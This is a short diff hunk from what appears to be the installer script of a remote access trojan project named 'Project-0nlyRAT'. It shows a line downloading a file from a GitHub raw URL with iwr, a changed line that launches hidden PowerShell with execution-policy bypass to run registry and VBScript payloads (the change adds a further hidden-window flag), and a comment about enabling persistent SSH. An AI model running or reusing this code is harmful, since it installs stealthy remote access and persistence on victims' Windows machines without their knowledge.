@@ -46,7 +46,7 @@ iwr -Uri "https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads
 
 # execute the registry entry process
 # .\"$reg_file.reg";"$vbs_file.vbs"
-powershell -noP -ep bypass Start-Process powershell.exe -windowstyle hidden ".\$reg_file.reg;.\$vbs_file.vbs"
+powershell -noP -ep bypass -w hidden Start-Process powershell.exe -windowstyle hidden ".\$reg_file.reg;.\$vbs_file.vbs"
 
 # enable persistent ssh
 # Install the OpenSSH Server feature
